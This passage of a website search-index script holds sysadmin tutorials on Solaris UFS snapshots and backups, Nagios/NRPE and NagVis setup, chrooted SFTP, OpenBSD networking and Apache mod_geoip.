unlink option was used when you built the snapshot, the backing-store file is deleted together with the snapshot. Otherwise, the backing-store file (which contains file system data) occupies disk space until you delete it manually. -F FSType Specifies the file system type to be used. -i Displays the state of an FSType snapshot. -V Echoes the complete command line but does not execute the command. -o Enables you to use special_options, such as the location and size of the backing-store (bs) file. To create a UFS snapshot, specify a backing-store path and the actual file system to be captured. The following is the command format:\nfssnap -F ufs -o bs=backing_store_path /file-system Note: The backing_store_path can be a raw device, the name of an existing directory, or the name of a file that does not already exist.\nThe following example uses the fssnap command to create a snapshot of the /export/home file system.\n# fssnap -F ufs -o bs=/var/tmp /export/home /dev/fssnap/0 The snapshot subsystem saves file system data in a file called a backing-store file before the data is overwritten. Some important aspects of a backing-store file are:\nA backing-store file is a bit-mapped file that takes up disk space until you delete the UFS snapshot. The size of the backing-store file varies with the amount of activity on the file system being captured. The destination path that you specify on the fssnap command line must have enough free space to hold the backing-store file. The location of the backing-store file must be different from that of the file system you want to capture in a UFS snapshot. A backing-store file can reside on different types of file systems, including another ufs file system or a mounted nfs file system. The fssnap command creates the backing-store file and two read-only virtual devices. The block virtual device, /dev/fssnap/0, can be mounted as a read-only file system. The raw virtual device, /dev/rfssnap/0, can be used for raw read-only access to a file system.\nThese virtual devices can be backed up with any of the existing Solaris OS backup commands. The backup created from a virtual device is a backup of the original file system when the UFS snapshot was taken.\nNote: When a UFS snapshot is first created, the file system locks temporarily. Users might notice a slight pause when writing to this file system. The length of the pause increases with the size of the file system. There is no performance impact when users are reading from the file system.\nBefore creating a UFS snapshot, use the df -k command to check that the backing-store file has enough disk space to grow. The size of the backing-store file depends on how much data has changed since the previous snapshot was taken.\nYou can limit the size of the backing-store file by using the -o maxsize=n option of the fssnap command, where n (k, m, or g) is the maximum size of the backing-store file specified in Kbytes, Mbytes, or Gbytes.\nCaution: If the backing-store file runs out of disk space, the system automatically deletes the UFS snapshot, which causes the backup to fail. The active ufs file system is not affected. Check the /var/adm/messages file for possible UFS snapshot errors.\nNote: You can force an unmount of an active ufs file system, for which a snapshot exists (for example, with the umount -f command). This action deletes the appropriate snapshot automatically.\nThe following example creates a snapshot of the /export/home file system, and limits the backing-store file to 500 Mbytes.\n# fssnap -F ufs -o bs=/var/tmp,maxsize=500m /export/home /dev/fssnap/0 You can use either fssnap command to display UFS snapshot information.\nThe following example displays a list of all the current UFS snapshots on the system. The list also displays the corresponding virtual device for each snapshot.\n# fssnap -i 0 /export/home 1 /usr 2 /database You use the -i option to the /usr/lib/fs/ufs/fssnap command to display detailed information for a specific UFS snapshot that was created by the fssnap command.\nThe following example shows the details for the /export/home snapshot.\n# /usr/lib/fs/ufs/fssnap -i /export/home Snapshot number : 0 Block Device : /dev/fssnap/0 Raw Device : /dev/rfssnap/0 Mount point : /export/home Device state : idle Backing store path : /var/tmp/snapshot0 Backing store size : 0 KB Maximum backing store size : 512000 KB Snapshot create time : Mon Oct 11 08:58:33 2004 Copy-on-write granularity : 32 KB tar linkYou can use the tar command or the ufsdump command to back up a UFS snapshot. Using the tar Command to Back Up a Snapshot File\nIf you use the tar command to back up the UFS snapshot, mount the snapshot before backing it up. The following procedure demonstrates how to do this type of mount.\nCreate the mount point for the block virtual device. mkdir -p /backups/home.bkup Mount the block virtual device to the mount point. mount -F ufs -o ro /dev/fssnap/0 /backups/home.bkup Change directory to the mount point. cd /backups/home.bkup Use the tar command to write the data to tape. tar cvf /dev/rmt/0 . Using the ufsdump Command\nIf you use the ufsdump command to back up a UFS snapshot, you can specify the raw virtual device during the backup.\nufsdump 0uf /dev/rmt/0 /dev/rfssnap/0 Verify that the UFS snapshot is backed up.\nufsrestore tf /dev/rmt/0 Incrementals restores linkIncremental backups of snapshots contain files that have been modified since the last UFS snapshot. You use the ufsdump command with the N option to create an incremental UFS snapshot, which writes the name of the device being backed up, rather than the name of the snapshot device to the /etc/dumpdates file.\nThe following example shows how to use the ufsdump command to create an incremental backup of a file system.\nNote: It is important to note the use of the N argument when backing up a snapshot. This argument ensures proper updates to the /etc/dumpdates file.\nufsdump 1ufN /dev/rmt/0 /dev/rdsk/c1t0d0s0 /dev/rfssnap/0 Next you would verify that the UFS snapshot is backed up to tape.\nufsrestore tf /dev/rmt/0 To understand incremental backups of snapshots, consider the following demonstration:\nCreate a snapshot of the /extra file system that is going to be backed up while the file system is mounted. # fssnap -o bs=/var/tmp /extra /dev/fssnap/0 Verify that the snapshot was successful, and view detailed information about the snapshot. # fssnap -i 0 /extra # /usr/lib/fs/ufs/fssnap -i /extra Snapshot number : 0 Block Device : /dev/fssnap/0 Raw Device : /dev/rfssnap/0 Mount point : /extra Device state : idle Backing store path : /var/tmp/snapshot0 Backing store size : 0 KB Maximum backing store size : Unlimited Snapshot create time : Mon Oct 11 10:34:21 2004 Copy-on-write granularity : 32 KB Make a directory that will be used to mount and view the snapshot data. mkdir /extrasnap Mount the snapshot to the new mount point, and compare the size of the file system and the snapshot device. # mount -o ro /dev/fssnap/0 /extrasnap # df -k |grep extra /dev/dsk/c1t0d0s0 1294023 9 1242254 1% /extra /dev/fssnap/0 1294023 9 1242254 1% /extrasnap Edit a file under the /extra directory and make it larger, and then compare the size of the file system and the snapshot device. # vi file1 (yank and put text, or read text in from another file) # df -k |grep extra /dev/dsk/c1t0d0s0 1294023 20 1242243 1% /extra /dev/fssnap/0 1294023 9 1242254 1% /extrasnap Observe that the file system grew in size while the snapshot file did not.\nPerform a full backup with the N option of the ufsdump command. # ufsdump 0ufN /dev/rmt/0 /dev/rdsk/c1t0d0s0 /dev/rfssnap/0 DUMP: Writing 32 Kilobyte records DUMP: Date of this level 0 dump: Mon Oct 11 10:49:38 2004 DUMP: Date of last level 0 dump: the epoch DUMP: Dumping /dev/rfssnap/0 (sys41:/extrasnap) to /dev/rmt/0. DUMP: Mapping (Pass I) [regular files] DUMP: Mapping (Pass II) [directories] DUMP: Estimated 262 blocks (131KB). DUMP: Dumping (Pass III) [directories] DUMP: Dumping (Pass IV) [regular files] DUMP: Tape rewinding DUMP: 254 blocks (127KB) on 1 volume at 1814 KB/sec DUMP: DUMP IS DONE DUMP: Level 0 dump on Mon Oct 11 11:03:46 2004 Verify the backup. # ufsrestore tf /dev/rmt/0 2 . 3 ./file1 4 ./file2 5 ./file3 6 ./file4 Unmount the back up device and remove the snapshot. umount /extrasnap fssnap -d /extra rm /var/tmp/snapshot0 Make some changes to the /extra file system, such as copying some files, and then re-create the snapshot. # cp file1 file5 # cp file1 file6 # fssnap -o bs=/var/tmp /extra /dev/fssnap/0 Re-mount the snapshot device, and compare the size of the file system and the snapshot device. # mount -o ro /dev/fssnap/0 /extrasnap # df -k |grep extra /dev/dsk/c1t0d0s0 1294023 46 1242217 1% /extra /dev/fssnap/0 1294023 46 1242217 1% /extrasnap Perform an incremental backup with the N option of the ufsdump command. # ufsdump 1ufN /dev/rmt/0 /dev/rdsk/c1t0d0s0 /dev/rfssnap/0 DUMP: Writing 32 Kilobyte records DUMP: Date of this level 0 dump: Mon Oct 11 13:13:03 2004 DUMP: Date of last level 0 dump: Mon Oct 11 12:30:44 2004 DUMP: Dumping /dev/rfssnap/0 (sys41:/extrasnap) to /dev/rmt/0. DUMP: Mapping (Pass I) [regular files] DUMP: Mapping (Pass II) [directories] DUMP: Estimated 294 blocks (147KB). DUMP: Dumping (Pass III) [directories] DUMP: Dumping (Pass IV) [regular files] DUMP: Tape rewinding DUMP: 254 blocks (127KB) on 1 volume at 1693 KB/sec DUMP: DUMP IS DONE DUMP: Level 1 dump on Mon Oct 11 13:22:36 2004 Verify the backup. # ufsrestore tf /dev/rmt/0 2 . 7 ./file5 8 ./file6 Notice that the backup of the snapshot contains only the files that were added since the previous Level 0 backup.\nThe backup created from a virtual device is a backup of the original file system when the UFS snapshot was taken.\nYou restore a UFS snapshot from a backup tape in the same manner as you would the backup of an original file system. Data written to a tape by ufsdump is simply data, whether it is a snapshot or a file system.\nTo restore the demo directory from the snapshot backup of the /usr file system, complete the following steps:\nLoad the tape that contains the snapshot backup of the /usr file system into the tape drive. Change to the /usr file system. cd /usr Perform the a ufsrestore command. # ufsrestore if /dev/rmt/0 ufsrestore \u003e add demo ufsrestore \u003e extract Specify next volume #: 1 set owner/mode for '.'? [yn] n ufsrestore \u003e quit Verify that the demo directory exists, and eject the tape. Deleting a UFS snapshot from the system is a multistep process and order-dependant. First, unmount the snapshot device, and then delete the snapshot. Finally, remove the backing-store file.\numount /dev/fssnap/0 fssnap -d /export/home rm /backing_store_file "
            }
        );
    index.add(
            {
                id:  665 ,
                href: "\/Mise_en_place_de_Nagios_NRPE_sur_Solaris_10\/",
                title: "Setting up Nagios NRPE on Solaris 10",
                description: "A guide on how to set up Nagios NRPE on Solaris 10 with detailed steps for installation and configuration.",
                content: "Introduction linkTraditionally Linux is the platform of choice for running Nagios however Solaris takes some beating for performance and reliability. Installing Nagios on Solaris is pretty straightforward however there are some tricks to make the install smoother.\nUsually our installation comprises Nagios 2.0, Nagios Plugins 1.4.2 and NRPE 2.4 so we’ll cover these here.\nOur target system is a Sun Ultra 60 so we’re using the SPARC version of Solaris 10. The same principles should apply to Solaris on Intel though.\nInstalling Solaris 10 linkWe started off with a vanilla install of Solaris 10 (01/06) and opted to install all packages except OEM. You can get away with less if you’re running the system headless.\nMany of the development tools and libraries we’ll need for Nagios come on the Solaris Companion DVD so the next step was to install those. Again we opted for the standard list of components.\nOur Ultra 60 only has a CD-ROM. To get around this we used NFS to mount the DVD from another server.\nPreparing Solaris linkIn order to make the Nagios install go smoothly we performed some tweaks. These are made from the command shell.\nSetting default shell to Bash link $ usermod -s /usr/bin/bash When you log in you’ll now get the Bash shell.\nIf you have a strong preference for another shell then free to use that instead :-)\nCorrecting Path linkThe default path misses packages installed from the Solaris Companion DVD, we can fix this by typing the following command:\n$ export PATH=/usr/sfw/bin:/usr/ccs/bin:/opt/sfw/bin/:/usr/bin:/usr/ucb:/usr/sbin Setting Compiler flags linkThese are optional but will make Nagios run faster on your system. Setting -mcpu and -mtune to ‘ultrasparc’ should be fine for most Sun UltraSPARC based systems. Using -pipe speeds up compilation but may cause problems if you are tight on memory.\n$ export CFLAGS=\"-O3 -pipe -mcpu=ultrasparc -mtune=ultrasparc\" More information can be found at gcc.gnu.org.\nMaking changes stick linkWe to make our changes permenant we appended the following lines to .profile in our home directory:\nPATH=/usr/sfw/bin:/usr/ccs/bin:/opt/sfw/bin/:/usr/bin:/usr/ucb:/usr/sbin CFLAGS=\"-O3 -pipe -mcpu=ultrasparc -mtune=ultrasparc\" export PATH CFLAGS Nagios Prerequisites linkGD Graphics Libraries linkWe found it was necessary to install the GD Graphics libraries for Nagios to compile, we used version 2.0.33. A standard ‘configure’, ‘make’ and ‘make install’ was sufficient, remember to install as root (or configure sudo). Software can be found at https://www.boutell.com/gd/\nNRPE linkWe found that NRPE couldn’t find the required SSL libraries to compile so we downloaded the package ‘openssl-0.9.8a-sol10-sparc-local.gz’ from Sun Freeware - https://www.sunfreeware.com/\nInstallation steps link $ gzip -d openssl-0.9.8a-sol10-sparc-local.gz $ su - # /usr/sbin/pkgadd -d openssl-0.9.8a-sol10-sparc-local $ exit Compilation and Installation linkBoth Nagios and Nagios Plugins compiled and installed as normal. NRPE required the following configuration parameters to correctly build:\n$ ./configure --with-ssl-lib=/usr/local/ssl/lib/ Now your system is ready to configure…\n"
            }
        );
    index.add(
            {
                id:  666 ,
                href: "\/SSH_:_Mise_en_place_du_serveur_SSH_Solaris_sur_une_installation_minimale\/",
                title: "SSH: Setting up SSH Server on a Minimal Solaris Installation",
                description: "How to install SSH server packages on a minimal Solaris 10 installation",
                content: "If you need to manage a Solaris 10 box with a minimal install, and SSH is not available, you can install it off of the 2nd CD. Rather than figure out the path to your CDROM (see this article), it was easier in our case to just tar up the needed packages and FTP them to our Solaris box:\nroot@srv-3 Product # cp -R SUNWsshcu SUNWsshdr SUNWsshdu SUNWsshr SUNWsshu /home/srv-1/sshpkg/ root@srv-3 Product # cd /home/srv-1/sshpkg/ root@srv-3 sshpkg # ls SUNWsshcu SUNWsshdr SUNWsshdu SUNWsshr SUNWsshu root@srv-3 sshpkg # tar -cf ../ssh.tar * root@srv-3 sshpkg # tar -tf ../ssh.tar SUNWsshcu/ SUNWsshcu/archive/ . . . SUNWsshu/reloc/ SUNWsshu/reloc/usr/ SUNWsshu/reloc/usr/bin/ SUNWsshu/reloc/usr/lib/ SUNWsshu/reloc/usr/lib/ssh/ root@srv-3 sshpkg # On the Solaris side, FTP these to /tmp, then from tmp:\ntar -xf ssh.tar pkgadd -d . svcadm enable ssh svcadm restart ssh "
            }
        );
    index.add(
            {
                id:  667 ,
                href: "\/Chrooter_des_comptes_SSH\/",
                title: "Chroot SSH Accounts",
                description: "How to configure SSH accounts with chroot environment for enhanced security",
                content: "Introduction linkThe OpenSSH version (4.8p1 for the GNU/Linux port) features a new configuration option: ChrootDirectory. This has been made possible by a new SFTP subsystem statically linked to sshd.\nThis makes it easy to replace a basic FTP service without the hassle of configuring encryption and/or bothering with FTP passive and active modes when operating through a NAT router. This is also simpler than packages such as rssh, scponly or other patches because it does not require setting up and maintaining (i.e. security updates) a chroot environment.\nInstallation linkTo enable it, you obviously need the new version 4.8p1. I personally use the cvs version and the debian/ directory of the sid package to build a well integrated Debian package 4.8p1~cvs-1.\nConfiguration linkIn /etc/ssh/sshd_config:\nYou need to configure OpenSSH to use its internal SFTP subsystem.\nSubsystem sftp internal-sftp Then, I configured chroot()ing in a match rule.\nMatch group sftponly ChrootDirectory /home/%u X11Forwarding no AllowTcpForwarding no ForceCommand internal-sftp The directory in which to chroot() must be owned by root. After the call to chroot(), sshd changes directory to the home directory relative to the new root directory. That is why I use / as home directory.\nchown root.root /home/user usermod -d / user adduser user sftponly This seems to work as expected:\n$ sftp user@host Connecting to host... user@host's password: sftp\u003e ls build cowbuildinall incoming johnbuilderclean sftp\u003e pwd Remote working directory: / sftp\u003e cd .. sftp\u003e ls build cowbuildinall incoming johnbuilderclean The only thing I miss is file transfers logging, but I did not investigate this at all. More on this whenever I find some time to do so.\n"
            }
        );
    index.add(
            {
                id:  668 ,
                href: "\/Cryptoloop_:_Mise_en_place_d%27un_dossier_crypt%C3%A9\/",
                title: "Cryptoloop: Setting Up an Encrypted Folder",
                description: "Guide on how to set up Cryptoloop for creating encrypted file containers",
                content: "Cryptoloop is the predecessor of CryptoFS. It’s a useful system because you create an empty encrypted file (image) of a specific size that can contain multiple files or folders.\nYou can then insert everything inside and everything is encrypted. You can even create a file the size of your partition to make a pseudo-encrypted volume. The disadvantage is that in case of a system crash, if you left the encrypted file open, you have a 50% chance of corrupting your data placed inside.\nTherefore, it should be used with caution. Here is some documentation:\nDocumentation on Cryptoloop\nDevice mapper and loop\n"
            }
        );
    index.add(
            {
                id:  669 ,
                href: "\/apprendre-le-perl-6\/",
                title: "Learning Perl 6",
                description: "Documentation to learn Perl 6 programming language quickly and efficiently",
                content: "Here is documentation to learn Perl 6 in record time. This documentation is super clear and relatively short compared to everything you’ll learn from it.\nLearning Perl 6\n"
            }
        );
    index.add(
            {
                id:  670 ,
                href: "\/PAM_Mount_et_SshFS_avec_authentification_par_mot_de_passe\/",
                title: "PAM Mount and SshFS with Password Authentication",
                description: "Guide for configuring PAM Mount with SSHFS using password authentication",
                content: "Here is documentation about SSHFS and PAM:\nDocumentation on PAM mount and SSHFS with password authentication\n"
            }
        );
    index.add(
            {
                id:  671 ,
                href: "\/SafeSquid_:_Coupler_avec_ClamAV_pour_filtrer_les_virus_sur_le_traffic_entrant\/",
                title: "SafeSquid: Coupling with ClamAV to Filter Viruses on Incoming Traffic",
                description: "How to set up SafeSquid with ClamAV to scan incoming traffic for viruses and enhance gateway security.",
                content: "SafeSquid coupled with ClamAV allows you to analyze incoming traffic to detect potential viruses. Here’s documentation on how to implement this:\nDocumentation on how to Set Up Gateway Level Virus Security With ClamAV And SafeSquid Proxy\n"
            }
        );
    index.add(
            {
                id:  672 ,
                href: "\/Diff%C3%A9rences_entre_du_et_df\/",
                title: "Differences between du and df",
                description: "Understanding the differences between du and df commands in Linux systems and how to troubleshoot space discrepancies between these two utilities.",
                content: "Issue linkYou will certainly ask yourself one day: “What is the difference between the du command and the df command?”\nAccording to the man page for du:\ndu - estimate file space usage And df displays exactly the space taken on your hard drive. I encountered a case where on a 30 GB partition, I had this:\ndu -sh | grep /home : 13 G used df -h /home : 26 G used The df command is not wrong.\nSolutions linkCheck the number and size of blocks on your partition linkIndeed, when formatting your partition, you can choose the block size. By default it’s 8KB. This means that if you have many files of just a few bytes, they will still take up 8KB each.\nThe only solution is to backup your data, reformat with a much smaller block size, and then restore the backup.\nCheck processes that are writing to this partition linkIt can happen that processes that were writing to the partition have crashed. In this case, the size remains in virtual memory and that’s when problems occur. So analyze your partition:\nlsof /home and check the running processes:\nps -aux "
            }
        );
    index.add(
            {
                id:  673 ,
                href: "\/Configurer_le_r%C3%A9seau_sous_OpenBSD\/",
                title: "Configure Network on OpenBSD",
                description: "A guide to basic network configuration on OpenBSD systems including interface setup, static IPs, gateways, DNS, and performance tuning",
                content: "Introduction linkI won’t go into too much detail, as that’s what the OpenBSD website is for. This is just a quick reference for recalling how to rapidly configure networking.\nBasic Configuration linkifconfig linkTo list available network cards and view defined IP addresses:\n$ ifconfig lo0: flags=8049 mtu 33224 inet 127.0.0.1 netmask 0xff000000 inet6 ::1 prefixlen 128 inet6 fe80::1%lo0 prefixlen 64 scopeid 0x5 lo1: flags=8008 mtu 33224 fxp0: flags=8843 mtu 1500 address: 00:04:ac:dd:39:6a media: Ethernet autoselect (100baseTX full-duplex) status: active inet 10.0.0.38 netmask 0xffffff00 broadcast 10.0.0.255 inet6 fe80::204:acff:fedd:396a%fxp0 prefixlen 64 scopeid 0x1 pflog0: flags=0\u003c\u003e mtu 33224 pfsync0: flags=0\u003c\u003e mtu 2020 sl0: flags=c010 mtu 296 sl1: flags=c010 mtu 296 ppp0: flags=8010 mtu 1500 ppp1: flags=8010 mtu 1500 tun0: flags=10 mtu 3000 tun1: flags=10 mtu 3000 enc0: flags=0\u003c\u003e mtu 1536 bridge0: flags=0\u003c\u003e mtu 1500 bridge1: flags=0\u003c\u003e mtu 1500 vlan0: flags=0\u003c\u003e mtu 1500 address: 00:00:00:00:00:00 vlan1: flags=0\u003c\u003e mtu 1500 address: 00:00:00:00:00:00 gre0: flags=9010 mtu 1450 carp0: flags=0\u003c\u003e mtu 1500 carp1: flags=0\u003c\u003e mtu 1500 gif0: flags=8010 mtu 1280 gif1: flags=8010 mtu 1280 gif2: flags=8010 mtu 1280 gif3: flags=8010 mtu 1280 Here’s a listing of available interfaces with their explanations:\nlo - Loopback Interface pflog - Packet Filter Logging Interface sl - SLIP Network Interface ppp - Point to Point Protocol tun - Tunnel Network Interface enc - Encapsulating Interface bridge - Ethernet Bridge Interface vlan - IEEE 802.1Q Encapsulation Interface gre - GRE/MobileIP Encapsulation Interface gif - Generic IPv4/IPv6 Tunnel Interface carp - Common Address Redundancy Protocol Interface Setting a Permanent IP linkSimply create a file /etc/hostname.interface_name and insert the IP and subnet mask:\necho \"inet 172.16.1.100 255.255.255.0 NONE\" \u003e /etc/hostname.fxp0 Default Gateway linkTo set your default gateway (or default route), create the file /etc/mygate and specify the desired IP:\necho \"172.16.1.254\" \u003e /etc/mygate DNS linkTo set DNS servers, it’s quite simple, as in all Unix-like systems, edit the resolv.conf file:\nsearch example.com nameserver 125.2.3.4 nameserver 125.2.3.5 Hostname linkTo define a machine’s hostname, simply insert the desired name in the /etc/myname file:\necho \"server\" \u003e /etc/myname Applying Changes Without Rebooting linkObviously, you don’t need to restart the machine, but you do need to restart the network services! To restart network services:\n$ sh /etc/netstart writing to routing socket: File exists add net 127: gateway 127.0.0.1: File exists writing to routing socket: File exists add net 224.0.0.0: gateway 127.0.0.1: File exists Routes linkTo display routes:\nroute show or\nnetstat -rn Finally, to add static routes, here’s an example of an /etc/hostname.if file (adapt to your needs):\ninet 192.168.254.254 255.255.255.0 NONE ! route add 10.0.0.0 192.168.254.1 Network Tuning linkImproving Performance on High Bandwidth linkIf you want to increase bandwidth performance, you can activate it via sysctl. To test temporarily:\nsysctl net.inet.tcp.recvspace=65536 sysctl net.inet.tcp.sendspace=65536 To make it permanent, add these lines to /etc/sysctl.conf:\necho \"# Increase performance\" \u003e\u003e /etc/sysctl.conf echo \"net.inet.tcp.recvspace=65536\" \u003e\u003e /etc/sysctl.conf echo \"net.inet.tcp.sendspace=65536\" \u003e\u003e /etc/sysctl.conf Resources linkOpenBSD Networking FAQ\nOpenBSD hostname man\n"
            }
        );
    index.add(
            {
                id:  674 ,
                href: "\/Geolocalisation_avec_Apache_2\/",
                title: "Geolocation with Apache 2",
                description: "A guide to set up and use mod_geoip with Apache 2 for geographical targeting and IP-based filtering.",
                content: "Introduction linkThis guide explains how to set up mod_geoip with Apache2 on a Debian Etch system. mod_geoip looks up the IP address of the client end user. This allows you to redirect or block users based on their country. You can also use this technology for your OpenX (formerly known as OpenAds or phpAdsNew) ad server to allow geo targeting.\nInstalling mod_geoip linkTo install mod_geoip, we simply run:\napt-get install libapache2-mod-geoip Then we open /etc/apache2/mods-available/geoip.conf and uncomment the GeoIPDBFile line so that the file looks as follows:\nvi /etc/apache2/mods-available/geoip.conf GeoIPEnable On GeoIPDBFile /usr/share/GeoIP/GeoIP.dat Next we restart Apache:\n/etc/init.d/apache2 restart That’s it already!\nA Short Test linkTo see if mod_geoip is working correctly, we can create a small PHP file in one of our web spaces (e.g. /var/www):\nvi /var/www/geoiptest.php \u003c?php $country_name = apache_note(\"GEOIP_COUNTRY_NAME\"); print \"Country: \" . $country_name; ?\u003e Call that file in a browser, and it should display your country (make sure that you’re calling the file from a public IP address, not a local one).\nUse Cases linkYou can use mod_geoip to redirect or block/allow users based on their country. You can also use mod_geoip with OpenX/OpenAds/phpAdsNew.\nReferences linkhttp://www.howtoforge.com/mod-geoip-apache2-debian-etch\nhttp://www.maxmind.com/app/mod_geoip\nhttp://www.maxmind.com/openads_geoip.pdf\n"
            }
        );
    index.add(
            {
                id:  675 ,
                href: "\/NagVis:_Cartographier_son_architecture_avec_ses_alertes_nagios\/",
                title: "NagVis: Map Your Architecture with Nagios Alerts",
                description: "Learn how to install and configure NagVis to display your Nagios alerts on custom infrastructure maps.",
                content: "Introduction linkNagVis is a really great product, easy to use but not to install. That’s why I did this documentation. You also need to install NDOUtils. We’ll see the installation too.\nNDOUtils linkPrepair System linkMake sure your System meets the requirements:\nNagios v2.X (stable) is running mysql (Version \u003e 4) Download NDOUtils linkYou can get the latest version of NDOUtils on the Nagios website https://www.nagios.org/download/\nUnpack NDOUtils linkUnpack NDOUtils in a path of your choice\ntar xvzf tar ndoutils-1.4.tar.gz You should have at least the following files and directories:\nConfig: This directory contains all the configuration file of NDOUtils. db: This directory contains all the sql information to install or upgrade the mysql database. docs: This directory contains the technical documentation of NDOUtils. Include: This directory contains all the libraries. src: This directory contains the source code. configure: This file will be use to compile the program Compiling NDOUtils linkUse the following commands to compile the NDO broker module, NDO2DB daemon, and additional utilities:\n./configure make After the compilation open the config.log file and take care that there’s no failed status inside. If there is some failed status it’s probably because you don’t have all the libraries installed in your C compiler. Install it and recompile it.\nNote:\ntail config.log Initializing the SQL Database linkYou have to create a database for storing the data.\nmysql -u root -p Enter password: Mysql\u003e CREATE DATABASE nagios; Mysql\u003eexit You also have to create a specific user for nagios with the rights: SELECT, INSERT, UPDATE, and DELETE.\nmysql -u root -p Enter password: Mysql\u003e GRANT SELECT,INSERT,UPDATE,DELETE,CREATE,DROP ON nagios.* TO nagios@localhost IDENTIFIED BY 'nagios'; Mysql\u003eexit Then now you can run the DB installation script in the db/ subdirectory.\ncd db ./installdb Make sure the script create the tables in the database (use phpmyadmin for exemple)\nConfiguration linkSample config files are included in the config/ subdirectory. You have 2 files to modify:\nNdomod.cfg, you have to change and uncomment the following lines: … # OUTPUT TYPE … #output_type=file output_type=tcpsocket #output_type=unixsocket … # OUTPUT … #output=/usr/local/nagios/var/ndo.dat output=127.0.0.1 #output=/usr/local/nagios/var/ndo.sock … # BUFFER FILE … #buffer_file=/usr/local/nagios/var/ndomod.tmp buffer_file=/var/cache/nagios2/ndomod.tmp … Feel free to change the other parameters according to your configuration.\nNdo2db.cfg, you have to change and uncomment the following lines: … # USER/GROUP PRIVILIGES … ndo2db_user=nagios ndo2db_group=nagios … # SOCKET TYPE … #socket_type=unix socket_type=tcp … # SOCKET NAME … socket_name=/var/cache/nagios2/ndo.sock … # DATABASE SERVER TYPE … db_servertype=mysql … # DATABASE NAME … db_name=nagios … # DATABASE USERNAME/PASSWORD … db_user=nagios db_pass=nagios … Feel free to change the other parameters according to your configuration.\nThere is another file to modify: Nagios.cfg. This file is located in the /etc/nagios/ directory. You have to enable the event_broker_option like this: … # EVENT BROKER OPTIONS … event_broker_options=-1 … # EVENT BROKER MODULE(S) … #broker_module=/somewhere/module1.o #broker_module=/somewhere/module2.o arg1 arg2=3 debug=0 broker_module=/usr/lib/nagios/ndoutils/ndomod.o config_file=/etc/nagios2/ndomod.cfg … Installation linkTo install the script you have to copy files compiled and the configuration files in the right directories.\nmkdir /usr/lib/nagios/ndoutils/ cp ./src/ndomod-2x.o /usr/lib/nagios/ndoutils/ndomod.o cp ./src/ndo2db-2x /usr/lib/nagios/ndoutils/ndo2db cp. /src/file2sock /usr/lib/nagios/ndoutils/file2sock cp. /src/log2ndo /usr/lib/nagios/ndoutils/log2ndo Getting Things Running linkStart the NDO2DB daemon:\n/usr/lib/nagios/ndoutils/ndo2db -c /etc/nagios2/ndo2db.cfg Start or restart nagios if is already running:\n/etc/init.d/nagios2 restart Check the Nagios logs to make sure it started okay:\nvi /var/log/nagios2 You should see some entries in the database. If you want that the NDO2DB start at the system, you have to create a script.\nNagVis linkPrepair System linkMake sure your System meets the requirements:\nNagios v2.X is running and authentication is configured (.htaccess file placed and configured properly!) NDOUtils v1.X is installed and worked (https://nagios.sourceforge.net/docs/ndoutils/NDOUtils.pdf) Working PHP installation (Version \u003e 4.2.0) with “php-gd” support php-mysql support is needed for the strongly recommended “ndomy” backend Download NagVis linkYou can get the latest version of Nagvis on the Nagvis’ website. https://www.nagvis.org/downloads\nUnpack NagVis linkUnpack NagVis in a path of your choice\ntar xvzf nagvis-1.2.x.tar.gz You should have the following files:\netc: This directory contain configuration file and demo Map. nagvis: This directory contain all the templates, images and functions of Nagvis. wui: This directory contain all Ajax functionalities (to configure map) Config.php: This file is used to configure maps. Index.php: This will be the index of Nagvis. Move NagVis linkPlace the NagVis directory tree (with etc, nagvis, wui, config.php and index.php inside) into your Nagios share folder.\nmv nagvis /usr/share/nagios2/htdocs/ Configure linkMove to new NagVis directory\ncd /usr/share/nagios2/htdocs/nagvis An example for the configuration file can be found in etc/nagvis.ini.php-sample. Copy this example to nagvis/etc/nagvis.ini.php.\ncp etc/nagvis.ini.php-sample etc/nagvis.ini.php Now you can edit this file with your favorite text editor:\nvi etc/nagvis.ini.php The most lines in the fresh copied config.ini.php are commented out. If you want to set different settings, than there are set, uncomment the line and change the value of it. Edit the following lines:\n[paths] ; absolute physical NagVis path base=\"/usr/share/nagios2/htdocs/nagvis/\" ; absolute html NagVis path htmlbase=\"/nagios2/nagvis\" ; absolute html NagVis cgi path htmlcgi=\"/nagios2/cgi-bin\" … [backend_ndomy_1] … ; hostname for NDO-db dbhost=\"localhost\"\t\u003c- The hostname of your database host ; portname for NDO-db dbport=3306\t\u003c- The port of listened by your database ; database-name for NDO-db dbname=\"nagios\"\t\u003c- The name of your database ; username for NDO-db dbuser=\"nagios\"\t\u003c- The login ; password for NDO-db dbpass=\"nagios\"\t\u003c- The password ; prefix for tables in NDO-db dbprefix=\"nagios_\"\t\u003c- The prefix of your tables … ; path to the cgi-bin of this backend htmlcgi=\"/nagios2/cgi-bin\" Permissions linkFirst check which user the webserver is running with (In my case it is www-data). If you don’t know which user the webserver is running on have a look at the webservers configuration. In case of apache you can do this by the following command:\ngrep -e '^User' /etc/apache2/httpd.conf If your configuration file is located in another path you should correct this in the command above. The set the permissions to your NagVis directory (In my case the path are like this):\nchown www-data. /usr/share/nagios2/htdocs/nagvis -R chmod 664 /usr/share/nagios2/htdocs/nagvis/etc/nagvis.ini.php chmod 775 /usr/share/nagios2/htdocs/nagvis/nagvis/images/maps chmod 664 /usr/share/nagios2/htdocs/nagvis/nagvis/images/maps/* chmod 775 /usr/share/nagios2/htdocs/nagvis/etc/maps chmod 664 /usr/share/nagios2/htdocs/nagvis/etc/maps/* It’s possible to set lower permissions on the files, in my setup it’s ok like this. Only change them if you know, what you are doing.\nThe WUI linkNagVis has an included web based config tool called WUI. If you want to use it use your browser to open the page:\nhttp:///nagvis/config.php Hint: If you have some script or popup blockers, disable them for the WUI.\nWhen you see the NagVis image, right click on it, a context menu should open, now you can configure NagVis and create maps with the WUI.\nThe Config Tools DOES NOT display the current Nagios States of Objects configured. Its only for configuring! To “use” your configured Maps afterwards, see STEP 7!\nIf this does’t work for you, or if you don’t want to use the WUI, you can simply edit the map config files in the nagvis/etc/maps/ directory with your favorite text editor. For valid format and values have a look at Map Config Format Description on NagVis.org (https://www.nagvis.org/docs/1.2/map_config_format_description).\nWatch the Maps linkYou should now be able to watch your defined maps in your browser:\nhttp:///nagvis/index.php?map= Resources linkhttps://www.nagvis.org/\n"
            }
        );
    index.add(
            {
                id:  676 ,
                href: "\/Mise_en_place_d\u0027un_serveur_de_rebond_pour_ses_connections_SSH\/",
                title: "Setting up an SSH Bouncer Server for Your SSH Connections",
                description: "This guide explains how to set up an SSH bouncer server to facilitate connections to machines in a DMZ, using key authentication and automatic mounting with FUSE.",
